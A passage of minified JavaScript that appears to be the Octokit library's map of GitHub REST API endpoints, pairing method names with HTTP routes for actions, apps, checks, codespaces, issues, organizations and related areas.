/repos/{owner}/{repo}/actions/organization-variables"],listRepoSecrets:["GET /repos/{owner}/{repo}/actions/secrets"],listRepoVariables:["GET /repos/{owner}/{repo}/actions/variables"],listRepoWorkflows:["GET /repos/{owner}/{repo}/actions/workflows"],listRunnerApplicationsForOrg:["GET /orgs/{org}/actions/runners/downloads"],listRunnerApplicationsForRepo:["GET /repos/{owner}/{repo}/actions/runners/downloads"],listSelectedReposForOrgSecret:["GET /orgs/{org}/actions/secrets/{secret_name}/repositories"],listSelectedReposForOrgVariable:["GET /orgs/{org}/actions/variables/{name}/repositories"],listSelectedRepositoriesEnabledGithubActionsOrganization:["GET /orgs/{org}/actions/permissions/repositories"],listSelfHostedRunnersForOrg:["GET /orgs/{org}/actions/runners"],listSelfHostedRunnersForRepo:["GET /repos/{owner}/{repo}/actions/runners"],listWorkflowRunArtifacts:["GET /repos/{owner}/{repo}/actions/runs/{run_id}/artifacts"],listWorkflowRuns:["GET /repos/{owner}/{repo}/actions/workflows/{workflow_id}/runs"],listWorkflowRunsForRepo:["GET /repos/{owner}/{repo}/actions/runs"],reRunJobForWorkflowRun:["POST /repos/{owner}/{repo}/actions/jobs/{job_id}/rerun"],reRunWorkflow:["POST /repos/{owner}/{repo}/actions/runs/{run_id}/rerun"],reRunWorkflowFailedJobs:["POST /repos/{owner}/{repo}/actions/runs/{run_id}/rerun-failed-jobs"],removeAllCustomLabelsFromSelfHostedRunnerForOrg:["DELETE /orgs/{org}/actions/runners/{runner_id}/labels"],removeAllCustomLabelsFromSelfHostedRunnerForRepo:["DELETE /repos/{owner}/{repo}/actions/runners/{runner_id}/labels"],removeCustomLabelFromSelfHostedRunnerForOrg:["DELETE /orgs/{org}/actions/runners/{runner_id}/labels/{name}"],removeCustomLabelFromSelfHostedRunnerForRepo:["DELETE /repos/{owner}/{repo}/actions/runners/{runner_id}/labels/{name}"],removeSelectedRepoFromOrgSecret:["DELETE /orgs/{org}/actions/secrets/{secret_name}/repositories/{repository_id}"],removeSelectedRepoFromOrgVariable:["DELETE /orgs/{org}/actions/variables/{name}/repositories/{repository_id}"],reviewCustomGatesForRun:["POST /repos/{owner}/{repo}/actions/runs/{run_id}/deployment_protection_rule"],reviewPendingDeploymentsForRun:["POST /repos/{owner}/{repo}/actions/runs/{run_id}/pending_deployments"],setAllowedActionsOrganization:["PUT /orgs/{org}/actions/permissions/selected-actions"],setAllowedActionsRepository:["PUT /repos/{owner}/{repo}/actions/permissions/selected-actions"],setCustomLabelsForSelfHostedRunnerForOrg:["PUT /orgs/{org}/actions/runners/{runner_id}/labels"],setCustomLabelsForSelfHostedRunnerForRepo:["PUT /repos/{owner}/{repo}/actions/runners/{runner_id}/labels"],setCustomOidcSubClaimForRepo:["PUT /repos/{owner}/{repo}/actions/oidc/customization/sub"],setGithubActionsDefaultWorkflowPermissionsOrganization:["PUT /orgs/{org}/actions/permissions/workflow"],setGithubActionsDefaultWorkflowPermissionsRepository:["PUT /repos/{owner}/{repo}/actions/permissions/workflow"],setGithubActionsPermissionsOrganization:["PUT /orgs/{org}/actions/permissions"],setGithubActionsPermissionsRepository:["PUT /repos/{owner}/{repo}/actions/permissions"],setSelectedReposForOrgSecret:["PUT /orgs/{org}/actions/secrets/{secret_name}/repositories"],setSelectedReposForOrgVariable:["PUT /orgs/{org}/actions/variables/{name}/repositories"],setSelectedRepositoriesEnabledGithubActionsOrganization:["PUT /orgs/{org}/actions/permissions/repositories"],setWorkflowAccessToRepository:["PUT /repos/{owner}/{repo}/actions/permissions/access"],updateEnvironmentVariable:["PATCH /repos/{owner}/{repo}/environments/{environment_name}/variables/{name}"],updateHostedRunnerForOrg:["PATCH /orgs/{org}/actions/hosted-runners/{hosted_runner_id}"],updateOrgVariable:["PATCH /orgs/{org}/actions/variables/{name}"],updateRepoVariable:["PATCH /repos/{owner}/{repo}/actions/variables/{name}"]},activity:{checkRepoIsStarredByAuthenticatedUser:["GET /user/starred/{owner}/{repo}"],deleteRepoSubscription:["DELETE /repos/{owner}/{repo}/subscription"],deleteThreadSubscription:["DELETE /notifications/threads/{thread_id}/subscription"],getFeeds:["GET /feeds"],getRepoSubscription:["GET /repos/{owner}/{repo}/subscription"],getThread:["GET /notifications/threads/{thread_id}"],getThreadSubscriptionForAuthenticatedUser:["GET /notifications/threads/{thread_id}/subscription"],listEventsForAuthenticatedUser:["GET /users/{username}/events"],listNotificationsForAuthenticatedUser:["GET /notifications"],listOrgEventsForAuthenticatedUser:["GET /users/{username}/events/orgs/{org}"],listPublicEvents:["GET /events"],listPublicEventsForRepoNetwork:["GET /networks/{owner}/{repo}/events"],listPublicEventsForUser:["GET /users/{username}/events/public"],listPublicOrgEvents:["GET /orgs/{org}/events"],listReceivedEventsForUser:["GET /users/{username}/received_events"],listReceivedPublicEventsForUser:["GET /users/{username}/received_events/public"],listRepoEvents:["GET /repos/{owner}/{repo}/events"],listRepoNotificationsForAuthenticatedUser:["GET /repos/{owner}/{repo}/notifications"],listReposStarredByAuthenticatedUser:["GET /user/starred"],listReposStarredByUser:["GET /users/{username}/starred"],listReposWatchedByUser:["GET /users/{username}/subscriptions"],listStargazersForRepo:["GET /repos/{owner}/{repo}/stargazers"],listWatchedReposForAuthenticatedUser:["GET /user/subscriptions"],listWatchersForRepo:["GET /repos/{owner}/{repo}/subscribers"],markNotificationsAsRead:["PUT /notifications"],markRepoNotificationsAsRead:["PUT /repos/{owner}/{repo}/notifications"],markThreadAsDone:["DELETE /notifications/threads/{thread_id}"],markThreadAsRead:["PATCH /notifications/threads/{thread_id}"],setRepoSubscription:["PUT /repos/{owner}/{repo}/subscription"],setThreadSubscription:["PUT /notifications/threads/{thread_id}/subscription"],starRepoForAuthenticatedUser:["PUT /user/starred/{owner}/{repo}"],unstarRepoForAuthenticatedUser:["DELETE /user/starred/{owner}/{repo}"]},apps:{addRepoToInstallation:["PUT /user/installations/{installation_id}/repositories/{repository_id}",{},{renamed:["apps","addRepoToInstallationForAuthenticatedUser"]}],addRepoToInstallationForAuthenticatedUser:["PUT /user/installations/{installation_id}/repositories/{repository_id}"],checkToken:["POST /applications/{client_id}/token"],createFromManifest:["POST /app-manifests/{code}/conversions"],createInstallationAccessToken:["POST /app/installations/{installation_id}/access_tokens"],deleteAuthorization:["DELETE /applications/{client_id}/grant"],deleteInstallation:["DELETE /app/installations/{installation_id}"],deleteToken:["DELETE /applications/{client_id}/token"],getAuthenticated:["GET /app"],getBySlug:["GET /apps/{app_slug}"],getInstallation:["GET /app/installations/{installation_id}"],getOrgInstallation:["GET /orgs/{org}/installation"],getRepoInstallation:["GET /repos/{owner}/{repo}/installation"],getSubscriptionPlanForAccount:["GET /marketplace_listing/accounts/{account_id}"],getSubscriptionPlanForAccountStubbed:["GET /marketplace_listing/stubbed/accounts/{account_id}"],getUserInstallation:["GET /users/{username}/installation"],getWebhookConfigForApp:["GET /app/hook/config"],getWebhookDelivery:["GET /app/hook/deliveries/{delivery_id}"],listAccountsForPlan:["GET /marketplace_listing/plans/{plan_id}/accounts"],listAccountsForPlanStubbed:["GET /marketplace_listing/stubbed/plans/{plan_id}/accounts"],listInstallationReposForAuthenticatedUser:["GET /user/installations/{installation_id}/repositories"],listInstallationRequestsForAuthenticatedApp:["GET /app/installation-requests"],listInstallations:["GET /app/installations"],listInstallationsForAuthenticatedUser:["GET /user/installations"],listPlans:["GET /marketplace_listing/plans"],listPlansStubbed:["GET /marketplace_listing/stubbed/plans"],listReposAccessibleToInstallation:["GET /installation/repositories"],listSubscriptionsForAuthenticatedUser:["GET /user/marketplace_purchases"],listSubscriptionsForAuthenticatedUserStubbed:["GET /user/marketplace_purchases/stubbed"],listWebhookDeliveries:["GET /app/hook/deliveries"],redeliverWebhookDelivery:["POST /app/hook/deliveries/{delivery_id}/attempts"],removeRepoFromInstallation:["DELETE /user/installations/{installation_id}/repositories/{repository_id}",{},{renamed:["apps","removeRepoFromInstallationForAuthenticatedUser"]}],removeRepoFromInstallationForAuthenticatedUser:["DELETE /user/installations/{installation_id}/repositories/{repository_id}"],resetToken:["PATCH /applications/{client_id}/token"],revokeInstallationAccessToken:["DELETE /installation/token"],scopeToken:["POST /applications/{client_id}/token/scoped"],suspendInstallation:["PUT /app/installations/{installation_id}/suspended"],unsuspendInstallation:["DELETE /app/installations/{installation_id}/suspended"],updateWebhookConfigForApp:["PATCH /app/hook/config"]},billing:{getGithubActionsBillingOrg:["GET /orgs/{org}/settings/billing/actions"],getGithubActionsBillingUser:["GET /users/{username}/settings/billing/actions"],getGithubBillingUsageReportOrg:["GET /organizations/{org}/settings/billing/usage"],getGithubPackagesBillingOrg:["GET /orgs/{org}/settings/billing/packages"],getGithubPackagesBillingUser:["GET /users/{username}/settings/billing/packages"],getSharedStorageBillingOrg:["GET /orgs/{org}/settings/billing/shared-storage"],getSharedStorageBillingUser:["GET /users/{username}/settings/billing/shared-storage"]},checks:{create:["POST /repos/{owner}/{repo}/check-runs"],createSuite:["POST /repos/{owner}/{repo}/check-suites"],get:["GET /repos/{owner}/{repo}/check-runs/{check_run_id}"],getSuite:["GET /repos/{owner}/{repo}/check-suites/{check_suite_id}"],listAnnotations:["GET /repos/{owner}/{repo}/check-runs/{check_run_id}/annotations"],listForRef:["GET /repos/{owner}/{repo}/commits/{ref}/check-runs"],listForSuite:["GET /repos/{owner}/{repo}/check-suites/{check_suite_id}/check-runs"],listSuitesForRef:["GET /repos/{owner}/{repo}/commits/{ref}/check-suites"],rerequestRun:["POST /repos/{owner}/{repo}/check-runs/{check_run_id}/rerequest"],rerequestSuite:["POST /repos/{owner}/{repo}/check-suites/{check_suite_id}/rerequest"],setSuitesPreferences:["PATCH /repos/{owner}/{repo}/check-suites/preferences"],update:["PATCH /repos/{owner}/{repo}/check-runs/{check_run_id}"]},codeScanning:{commitAutofix:["POST /repos/{owner}/{repo}/code-scanning/alerts/{alert_number}/autofix/commits"],createAutofix:["POST /repos/{owner}/{repo}/code-scanning/alerts/{alert_number}/autofix"],createVariantAnalysis:["POST /repos/{owner}/{repo}/code-scanning/codeql/variant-analyses"],deleteAnalysis:["DELETE /repos/{owner}/{repo}/code-scanning/analyses/{analysis_id}{?confirm_delete}"],deleteCodeqlDatabase:["DELETE /repos/{owner}/{repo}/code-scanning/codeql/databases/{language}"],getAlert:["GET /repos/{owner}/{repo}/code-scanning/alerts/{alert_number}",{},{renamedParameters:{alert_id:"alert_number"}}],getAnalysis:["GET /repos/{owner}/{repo}/code-scanning/analyses/{analysis_id}"],getAutofix:["GET /repos/{owner}/{repo}/code-scanning/alerts/{alert_number}/autofix"],getCodeqlDatabase:["GET /repos/{owner}/{repo}/code-scanning/codeql/databases/{language}"],getDefaultSetup:["GET /repos/{owner}/{repo}/code-scanning/default-setup"],getSarif:["GET /repos/{owner}/{repo}/code-scanning/sarifs/{sarif_id}"],getVariantAnalysis:["GET /repos/{owner}/{repo}/code-scanning/codeql/variant-analyses/{codeql_variant_analysis_id}"],getVariantAnalysisRepoTask:["GET /repos/{owner}/{repo}/code-scanning/codeql/variant-analyses/{codeql_variant_analysis_id}/repos/{repo_owner}/{repo_name}"],listAlertInstances:["GET /repos/{owner}/{repo}/code-scanning/alerts/{alert_number}/instances"],listAlertsForOrg:["GET /orgs/{org}/code-scanning/alerts"],listAlertsForRepo:["GET /repos/{owner}/{repo}/code-scanning/alerts"],listAlertsInstances:["GET /repos/{owner}/{repo}/code-scanning/alerts/{alert_number}/instances",{},{renamed:["codeScanning","listAlertInstances"]}],listCodeqlDatabases:["GET /repos/{owner}/{repo}/code-scanning/codeql/databases"],listRecentAnalyses:["GET /repos/{owner}/{repo}/code-scanning/analyses"],updateAlert:["PATCH /repos/{owner}/{repo}/code-scanning/alerts/{alert_number}"],updateDefaultSetup:["PATCH /repos/{owner}/{repo}/code-scanning/default-setup"],uploadSarif:["POST /repos/{owner}/{repo}/code-scanning/sarifs"]},codeSecurity:{attachConfiguration:["POST /orgs/{org}/code-security/configurations/{configuration_id}/attach"],attachEnterpriseConfiguration:["POST /enterprises/{enterprise}/code-security/configurations/{configuration_id}/attach"],createConfiguration:["POST /orgs/{org}/code-security/configurations"],createConfigurationForEnterprise:["POST /enterprises/{enterprise}/code-security/configurations"],deleteConfiguration:["DELETE /orgs/{org}/code-security/configurations/{configuration_id}"],deleteConfigurationForEnterprise:["DELETE /enterprises/{enterprise}/code-security/configurations/{configuration_id}"],detachConfiguration:["DELETE /orgs/{org}/code-security/configurations/detach"],getConfiguration:["GET /orgs/{org}/code-security/configurations/{configuration_id}"],getConfigurationForRepository:["GET /repos/{owner}/{repo}/code-security-configuration"],getConfigurationsForEnterprise:["GET /enterprises/{enterprise}/code-security/configurations"],getConfigurationsForOrg:["GET /orgs/{org}/code-security/configurations"],getDefaultConfigurations:["GET /orgs/{org}/code-security/configurations/defaults"],getDefaultConfigurationsForEnterprise:["GET /enterprises/{enterprise}/code-security/configurations/defaults"],getRepositoriesForConfiguration:["GET /orgs/{org}/code-security/configurations/{configuration_id}/repositories"],getRepositoriesForEnterpriseConfiguration:["GET /enterprises/{enterprise}/code-security/configurations/{configuration_id}/repositories"],getSingleConfigurationForEnterprise:["GET /enterprises/{enterprise}/code-security/configurations/{configuration_id}"],setConfigurationAsDefault:["PUT /orgs/{org}/code-security/configurations/{configuration_id}/defaults"],setConfigurationAsDefaultForEnterprise:["PUT /enterprises/{enterprise}/code-security/configurations/{configuration_id}/defaults"],updateConfiguration:["PATCH /orgs/{org}/code-security/configurations/{configuration_id}"],updateEnterpriseConfiguration:["PATCH /enterprises/{enterprise}/code-security/configurations/{configuration_id}"]},codesOfConduct:{getAllCodesOfConduct:["GET /codes_of_conduct"],getConductCode:["GET /codes_of_conduct/{key}"]},codespaces:{addRepositoryForSecretForAuthenticatedUser:["PUT /user/codespaces/secrets/{secret_name}/repositories/{repository_id}"],addSelectedRepoToOrgSecret:["PUT /orgs/{org}/codespaces/secrets/{secret_name}/repositories/{repository_id}"],checkPermissionsForDevcontainer:["GET /repos/{owner}/{repo}/codespaces/permissions_check"],codespaceMachinesForAuthenticatedUser:["GET /user/codespaces/{codespace_name}/machines"],createForAuthenticatedUser:["POST /user/codespaces"],createOrUpdateOrgSecret:["PUT /orgs/{org}/codespaces/secrets/{secret_name}"],createOrUpdateRepoSecret:["PUT /repos/{owner}/{repo}/codespaces/secrets/{secret_name}"],createOrUpdateSecretForAuthenticatedUser:["PUT /user/codespaces/secrets/{secret_name}"],createWithPrForAuthenticatedUser:["POST /repos/{owner}/{repo}/pulls/{pull_number}/codespaces"],createWithRepoForAuthenticatedUser:["POST /repos/{owner}/{repo}/codespaces"],deleteForAuthenticatedUser:["DELETE /user/codespaces/{codespace_name}"],deleteFromOrganization:["DELETE /orgs/{org}/members/{username}/codespaces/{codespace_name}"],deleteOrgSecret:["DELETE /orgs/{org}/codespaces/secrets/{secret_name}"],deleteRepoSecret:["DELETE /repos/{owner}/{repo}/codespaces/secrets/{secret_name}"],deleteSecretForAuthenticatedUser:["DELETE /user/codespaces/secrets/{secret_name}"],exportForAuthenticatedUser:["POST /user/codespaces/{codespace_name}/exports"],getCodespacesForUserInOrg:["GET /orgs/{org}/members/{username}/codespaces"],getExportDetailsForAuthenticatedUser:["GET /user/codespaces/{codespace_name}/exports/{export_id}"],getForAuthenticatedUser:["GET /user/codespaces/{codespace_name}"],getOrgPublicKey:["GET /orgs/{org}/codespaces/secrets/public-key"],getOrgSecret:["GET /orgs/{org}/codespaces/secrets/{secret_name}"],getPublicKeyForAuthenticatedUser:["GET /user/codespaces/secrets/public-key"],getRepoPublicKey:["GET /repos/{owner}/{repo}/codespaces/secrets/public-key"],getRepoSecret:["GET /repos/{owner}/{repo}/codespaces/secrets/{secret_name}"],getSecretForAuthenticatedUser:["GET /user/codespaces/secrets/{secret_name}"],listDevcontainersInRepositoryForAuthenticatedUser:["GET /repos/{owner}/{repo}/codespaces/devcontainers"],listForAuthenticatedUser:["GET /user/codespaces"],listInOrganization:["GET /orgs/{org}/codespaces",{},{renamedParameters:{org_id:"org"}}],listInRepositoryForAuthenticatedUser:["GET /repos/{owner}/{repo}/codespaces"],listOrgSecrets:["GET /orgs/{org}/codespaces/secrets"],listRepoSecrets:["GET /repos/{owner}/{repo}/codespaces/secrets"],listRepositoriesForSecretForAuthenticatedUser:["GET /user/codespaces/secrets/{secret_name}/repositories"],listSecretsForAuthenticatedUser:["GET /user/codespaces/secrets"],listSelectedReposForOrgSecret:["GET /orgs/{org}/codespaces/secrets/{secret_name}/repositories"],preFlightWithRepoForAuthenticatedUser:["GET /repos/{owner}/{repo}/codespaces/new"],publishForAuthenticatedUser:["POST /user/codespaces/{codespace_name}/publish"],removeRepositoryForSecretForAuthenticatedUser:["DELETE /user/codespaces/secrets/{secret_name}/repositories/{repository_id}"],removeSelectedRepoFromOrgSecret:["DELETE /orgs/{org}/codespaces/secrets/{secret_name}/repositories/{repository_id}"],repoMachinesForAuthenticatedUser:["GET /repos/{owner}/{repo}/codespaces/machines"],setRepositoriesForSecretForAuthenticatedUser:["PUT /user/codespaces/secrets/{secret_name}/repositories"],setSelectedReposForOrgSecret:["PUT /orgs/{org}/codespaces/secrets/{secret_name}/repositories"],startForAuthenticatedUser:["POST /user/codespaces/{codespace_name}/start"],stopForAuthenticatedUser:["POST /user/codespaces/{codespace_name}/stop"],stopInOrganization:["POST /orgs/{org}/members/{username}/codespaces/{codespace_name}/stop"],updateForAuthenticatedUser:["PATCH /user/codespaces/{codespace_name}"]},copilot:{addCopilotSeatsForTeams:["POST /orgs/{org}/copilot/billing/selected_teams"],addCopilotSeatsForUsers:["POST /orgs/{org}/copilot/billing/selected_users"],cancelCopilotSeatAssignmentForTeams:["DELETE /orgs/{org}/copilot/billing/selected_teams"],cancelCopilotSeatAssignmentForUsers:["DELETE /orgs/{org}/copilot/billing/selected_users"],copilotMetricsForOrganization:["GET /orgs/{org}/copilot/metrics"],copilotMetricsForTeam:["GET /orgs/{org}/team/{team_slug}/copilot/metrics"],getCopilotOrganizationDetails:["GET /orgs/{org}/copilot/billing"],getCopilotSeatDetailsForUser:["GET /orgs/{org}/members/{username}/copilot"],listCopilotSeats:["GET /orgs/{org}/copilot/billing/seats"],usageMetricsForOrg:["GET /orgs/{org}/copilot/usage"],usageMetricsForTeam:["GET /orgs/{org}/team/{team_slug}/copilot/usage"]},dependabot:{addSelectedRepoToOrgSecret:["PUT /orgs/{org}/dependabot/secrets/{secret_name}/repositories/{repository_id}"],createOrUpdateOrgSecret:["PUT /orgs/{org}/dependabot/secrets/{secret_name}"],createOrUpdateRepoSecret:["PUT /repos/{owner}/{repo}/dependabot/secrets/{secret_name}"],deleteOrgSecret:["DELETE /orgs/{org}/dependabot/secrets/{secret_name}"],deleteRepoSecret:["DELETE /repos/{owner}/{repo}/dependabot/secrets/{secret_name}"],getAlert:["GET /repos/{owner}/{repo}/dependabot/alerts/{alert_number}"],getOrgPublicKey:["GET /orgs/{org}/dependabot/secrets/public-key"],getOrgSecret:["GET /orgs/{org}/dependabot/secrets/{secret_name}"],getRepoPublicKey:["GET /repos/{owner}/{repo}/dependabot/secrets/public-key"],getRepoSecret:["GET /repos/{owner}/{repo}/dependabot/secrets/{secret_name}"],listAlertsForEnterprise:["GET /enterprises/{enterprise}/dependabot/alerts"],listAlertsForOrg:["GET /orgs/{org}/dependabot/alerts"],listAlertsForRepo:["GET /repos/{owner}/{repo}/dependabot/alerts"],listOrgSecrets:["GET /orgs/{org}/dependabot/secrets"],listRepoSecrets:["GET /repos/{owner}/{repo}/dependabot/secrets"],listSelectedReposForOrgSecret:["GET /orgs/{org}/dependabot/secrets/{secret_name}/repositories"],removeSelectedRepoFromOrgSecret:["DELETE /orgs/{org}/dependabot/secrets/{secret_name}/repositories/{repository_id}"],setSelectedReposForOrgSecret:["PUT /orgs/{org}/dependabot/secrets/{secret_name}/repositories"],updateAlert:["PATCH /repos/{owner}/{repo}/dependabot/alerts/{alert_number}"]},dependencyGraph:{createRepositorySnapshot:["POST /repos/{owner}/{repo}/dependency-graph/snapshots"],diffRange:["GET /repos/{owner}/{repo}/dependency-graph/compare/{basehead}"],exportSbom:["GET /repos/{owner}/{repo}/dependency-graph/sbom"]},emojis:{get:["GET /emojis"]},gists:{checkIsStarred:["GET /gists/{gist_id}/star"],create:["POST /gists"],createComment:["POST /gists/{gist_id}/comments"],delete:["DELETE /gists/{gist_id}"],deleteComment:["DELETE /gists/{gist_id}/comments/{comment_id}"],fork:["POST /gists/{gist_id}/forks"],get:["GET /gists/{gist_id}"],getComment:["GET /gists/{gist_id}/comments/{comment_id}"],getRevision:["GET /gists/{gist_id}/{sha}"],list:["GET /gists"],listComments:["GET /gists/{gist_id}/comments"],listCommits:["GET /gists/{gist_id}/commits"],listForUser:["GET /users/{username}/gists"],listForks:["GET /gists/{gist_id}/forks"],listPublic:["GET /gists/public"],listStarred:["GET /gists/starred"],star:["PUT /gists/{gist_id}/star"],unstar:["DELETE /gists/{gist_id}/star"],update:["PATCH /gists/{gist_id}"],updateComment:["PATCH /gists/{gist_id}/comments/{comment_id}"]},git:{createBlob:["POST /repos/{owner}/{repo}/git/blobs"],createCommit:["POST /repos/{owner}/{repo}/git/commits"],createRef:["POST /repos/{owner}/{repo}/git/refs"],createTag:["POST /repos/{owner}/{repo}/git/tags"],createTree:["POST /repos/{owner}/{repo}/git/trees"],deleteRef:["DELETE /repos/{owner}/{repo}/git/refs/{ref}"],getBlob:["GET /repos/{owner}/{repo}/git/blobs/{file_sha}"],getCommit:["GET /repos/{owner}/{repo}/git/commits/{commit_sha}"],getRef:["GET /repos/{owner}/{repo}/git/ref/{ref}"],getTag:["GET /repos/{owner}/{repo}/git/tags/{tag_sha}"],getTree:["GET /repos/{owner}/{repo}/git/trees/{tree_sha}"],listMatchingRefs:["GET /repos/{owner}/{repo}/git/matching-refs/{ref}"],updateRef:["PATCH /repos/{owner}/{repo}/git/refs/{ref}"]},gitignore:{getAllTemplates:["GET /gitignore/templates"],getTemplate:["GET /gitignore/templates/{name}"]},hostedCompute:{createNetworkConfigurationForOrg:["POST /orgs/{org}/settings/network-configurations"],deleteNetworkConfigurationFromOrg:["DELETE /orgs/{org}/settings/network-configurations/{network_configuration_id}"],getNetworkConfigurationForOrg:["GET /orgs/{org}/settings/network-configurations/{network_configuration_id}"],getNetworkSettingsForOrg:["GET /orgs/{org}/settings/network-settings/{network_settings_id}"],listNetworkConfigurationsForOrg:["GET /orgs/{org}/settings/network-configurations"],updateNetworkConfigurationForOrg:["PATCH /orgs/{org}/settings/network-configurations/{network_configuration_id}"]},interactions:{getRestrictionsForAuthenticatedUser:["GET /user/interaction-limits"],getRestrictionsForOrg:["GET /orgs/{org}/interaction-limits"],getRestrictionsForRepo:["GET /repos/{owner}/{repo}/interaction-limits"],getRestrictionsForYourPublicRepos:["GET /user/interaction-limits",{},{renamed:["interactions","getRestrictionsForAuthenticatedUser"]}],removeRestrictionsForAuthenticatedUser:["DELETE /user/interaction-limits"],removeRestrictionsForOrg:["DELETE /orgs/{org}/interaction-limits"],removeRestrictionsForRepo:["DELETE /repos/{owner}/{repo}/interaction-limits"],removeRestrictionsForYourPublicRepos:["DELETE /user/interaction-limits",{},{renamed:["interactions","removeRestrictionsForAuthenticatedUser"]}],setRestrictionsForAuthenticatedUser:["PUT /user/interaction-limits"],setRestrictionsForOrg:["PUT /orgs/{org}/interaction-limits"],setRestrictionsForRepo:["PUT /repos/{owner}/{repo}/interaction-limits"],setRestrictionsForYourPublicRepos:["PUT /user/interaction-limits",{},{renamed:["interactions","setRestrictionsForAuthenticatedUser"]}]},issues:{addAssignees:["POST /repos/{owner}/{repo}/issues/{issue_number}/assignees"],addLabels:["POST /repos/{owner}/{repo}/issues/{issue_number}/labels"],addSubIssue:["POST /repos/{owner}/{repo}/issues/{issue_number}/sub_issues"],checkUserCanBeAssigned:["GET /repos/{owner}/{repo}/assignees/{assignee}"],checkUserCanBeAssignedToIssue:["GET /repos/{owner}/{repo}/issues/{issue_number}/assignees/{assignee}"],create:["POST /repos/{owner}/{repo}/issues"],createComment:["POST /repos/{owner}/{repo}/issues/{issue_number}/comments"],createLabel:["POST /repos/{owner}/{repo}/labels"],createMilestone:["POST /repos/{owner}/{repo}/milestones"],deleteComment:["DELETE /repos/{owner}/{repo}/issues/comments/{comment_id}"],deleteLabel:["DELETE /repos/{owner}/{repo}/labels/{name}"],deleteMilestone:["DELETE /repos/{owner}/{repo}/milestones/{milestone_number}"],get:["GET /repos/{owner}/{repo}/issues/{issue_number}"],getComment:["GET /repos/{owner}/{repo}/issues/comments/{comment_id}"],getEvent:["GET /repos/{owner}/{repo}/issues/events/{event_id}"],getLabel:["GET /repos/{owner}/{repo}/labels/{name}"],getMilestone:["GET /repos/{owner}/{repo}/milestones/{milestone_number}"],list:["GET /issues"],listAssignees:["GET /repos/{owner}/{repo}/assignees"],listComments:["GET /repos/{owner}/{repo}/issues/{issue_number}/comments"],listCommentsForRepo:["GET /repos/{owner}/{repo}/issues/comments"],listEvents:["GET /repos/{owner}/{repo}/issues/{issue_number}/events"],listEventsForRepo:["GET /repos/{owner}/{repo}/issues/events"],listEventsForTimeline:["GET /repos/{owner}/{repo}/issues/{issue_number}/timeline"],listForAuthenticatedUser:["GET /user/issues"],listForOrg:["GET /orgs/{org}/issues"],listForRepo:["GET /repos/{owner}/{repo}/issues"],listLabelsForMilestone:["GET /repos/{owner}/{repo}/milestones/{milestone_number}/labels"],listLabelsForRepo:["GET /repos/{owner}/{repo}/labels"],listLabelsOnIssue:["GET /repos/{owner}/{repo}/issues/{issue_number}/labels"],listMilestones:["GET /repos/{owner}/{repo}/milestones"],listSubIssues:["GET /repos/{owner}/{repo}/issues/{issue_number}/sub_issues"],lock:["PUT /repos/{owner}/{repo}/issues/{issue_number}/lock"],removeAllLabels:["DELETE /repos/{owner}/{repo}/issues/{issue_number}/labels"],removeAssignees:["DELETE /repos/{owner}/{repo}/issues/{issue_number}/assignees"],removeLabel:["DELETE /repos/{owner}/{repo}/issues/{issue_number}/labels/{name}"],removeSubIssue:["DELETE /repos/{owner}/{repo}/issues/{issue_number}/sub_issue"],reprioritizeSubIssue:["PATCH /repos/{owner}/{repo}/issues/{issue_number}/sub_issues/priority"],setLabels:["PUT /repos/{owner}/{repo}/issues/{issue_number}/labels"],unlock:["DELETE /repos/{owner}/{repo}/issues/{issue_number}/lock"],update:["PATCH /repos/{owner}/{repo}/issues/{issue_number}"],updateComment:["PATCH /repos/{owner}/{repo}/issues/comments/{comment_id}"],updateLabel:["PATCH /repos/{owner}/{repo}/labels/{name}"],updateMilestone:["PATCH /repos/{owner}/{repo}/milestones/{milestone_number}"]},licenses:{get:["GET /licenses/{license}"],getAllCommonlyUsed:["GET /licenses"],getForRepo:["GET /repos/{owner}/{repo}/license"]},markdown:{render:["POST /markdown"],renderRaw:["POST /markdown/raw",{headers:{"content-type":"text/plain; charset=utf-8"}}]},meta:{get:["GET /meta"],getAllVersions:["GET /versions"],getOctocat:["GET /octocat"],getZen:["GET /zen"],root:["GET /"]},migrations:{deleteArchiveForAuthenticatedUser:["DELETE /user/migrations/{migration_id}/archive"],deleteArchiveForOrg:["DELETE /orgs/{org}/migrations/{migration_id}/archive"],downloadArchiveForOrg:["GET /orgs/{org}/migrations/{migration_id}/archive"],getArchiveForAuthenticatedUser:["GET /user/migrations/{migration_id}/archive"],getStatusForAuthenticatedUser:["GET /user/migrations/{migration_id}"],getStatusForOrg:["GET /orgs/{org}/migrations/{migration_id}"],listForAuthenticatedUser:["GET /user/migrations"],listForOrg:["GET /orgs/{org}/migrations"],listReposForAuthenticatedUser:["GET /user/migrations/{migration_id}/repositories"],listReposForOrg:["GET /orgs/{org}/migrations/{migration_id}/repositories"],listReposForUser:["GET /user/migrations/{migration_id}/repositories",{},{renamed:["migrations","listReposForAuthenticatedUser"]}],startForAuthenticatedUser:["POST /user/migrations"],startForOrg:["POST /orgs/{org}/migrations"],unlockRepoForAuthenticatedUser:["DELETE /user/migrations/{migration_id}/repos/{repo_name}/lock"],unlockRepoForOrg:["DELETE /orgs/{org}/migrations/{migration_id}/repos/{repo_name}/lock"]},oidc:{getOidcCustomSubTemplateForOrg:["GET /orgs/{org}/actions/oidc/customization/sub"],updateOidcCustomSubTemplateForOrg:["PUT /orgs/{org}/actions/oidc/customization/sub"]},orgs:{addSecurityManagerTeam:["PUT /orgs/{org}/security-managers/teams/{team_slug}",{},{deprecated:"octokit.rest.orgs.addSecurityManagerTeam() is deprecated, see https://docs.github.com/rest/orgs/security-managers#add-a-security-manager-team"}],assignTeamToOrgRole:["PUT /orgs/{org}/organization-roles/teams/{team_slug}/{role_id}"],assignUserToOrgRole:["PUT /orgs/{org}/organization-roles/users/{username}/{role_id}"],blockUser:["PUT /orgs/{org}/blocks/{username}"],cancelInvitation:["DELETE /orgs/{org}/invitations/{invitation_id}"],checkBlockedUser:["GET /orgs/{org}/blocks/{username}"],checkMembershipForUser:["GET /orgs/{org}/members/{username}"],checkPublicMembershipForUser:["GET /orgs/{org}/public_members/{username}"],convertMemberToOutsideCollaborator:["PUT /orgs/{org}/outside_collaborators/{username}"],createInvitation:["POST /orgs/{org}/invitations"],createIssueType:["POST /orgs/{org}/issue-types"],createOrUpdateCustomProperties:["PATCH /orgs/{org}/properties/schema"],createOrUpdateCustomPropertiesValuesForRepos:["PATCH /orgs/{org}/properties/values"],createOrUpdateCustomProperty:["PUT /orgs/{org}/properties/schema/{custom_property_name}"],createWebhook:["POST /orgs/{org}/hooks"],delete:["DELETE /orgs/{org}"],deleteIssueType:["DELETE /orgs/{org}/issue-types/{issue_type_id}"],deleteWebhook:["DELETE 